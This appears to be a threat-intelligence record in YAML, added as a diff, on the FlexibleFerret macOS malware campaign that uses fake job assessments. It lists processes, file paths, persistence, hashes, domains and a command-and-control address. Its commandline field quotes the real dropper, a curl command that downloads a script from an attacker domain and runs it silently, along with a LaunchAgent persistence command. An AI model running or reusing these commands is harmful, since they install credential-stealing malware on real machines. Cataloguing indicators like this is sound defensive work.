@@ -1,0 +1,56 @@
+description: FlexibleFerret malware uses fake job assessments to deploy and steal
+  credentials.
+attribution: DPRK-aligned operators
+malware_families:
+- FlexibleFerret
+TTPs:
+  processes:
+  - bash
+  - curl
+  - unzip
+  - launchctl
+  - open
+  commandline:
+  - curl -k -o /var/tmp/macpatch.sh https://app.zynoracreative.com/updrv8/drvMac-as7t.patch & chmod +x /var/tmp/macpatch.sh & nohup bash /var/tmp/macpatch.sh >/dev/null 2>&1
+  - ./bin/go run "driv.go"
+  scripting_engine:
+  - bash
+  - Bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl, hXXps://app.zynoracreative.com/updrv8/drvMac-as7t.patch
+  - launchctl load ~/Library/LaunchAgents/com.driver9990as7tpatch.plist
+  - drivfixer.sh, http://95.169.180.140:8080
+  file_activity:
+  - /var/tmp/macpatch.sh
+  - /var/tmp/CDrivers.zip
+  - /var/tmp/CDrivers/drivfixer.sh
+  - ~/Library/LaunchAgents/com.driver9990as7tpatch.plist
+  - /var/tmp/CDrivers/MediaPatcher.app
+  - ./bin/go
+  - ./driv.go
+  persistence:
+  - launchctl load ~/Library/LaunchAgents/com.driver9990as7tpatch.plist
+  process_relations: []
+IOCs:
+  hashes:
+  - 4faf567238e22a6217270c550aa9437141e693eb28bbf460c9996071fda0ab05
+  - 159046fd26701315cfd79bd392a8fa05d4bcae47cfa2409f03628b823cb477c4
+  - 01a8ae878073d950abd6cf70d8e266a4cbefad9b4de6c256b2516bdbd11cbfe8
+  ip_addresses:
+  - 95.169.180.140
+  domains:
+  - compassidea.org
+  - zynoracreative.com
+  - proficiencycert.com
+  - evaluino.com
+  - evaluza.com
+  urls:
+  - hXXps://app.zynoracreative.com/updrv8/drvMac-as7t.patch
+  - http://95.169.180.140:8080
+authors:
+- Ferdous Saljooki
+reference: https://www.jamf.com/blog/flexibleferret-malware-continues-to-adapt/
+date_of_publication: December 03, 2025
+file_creation_date: December 03, 2025
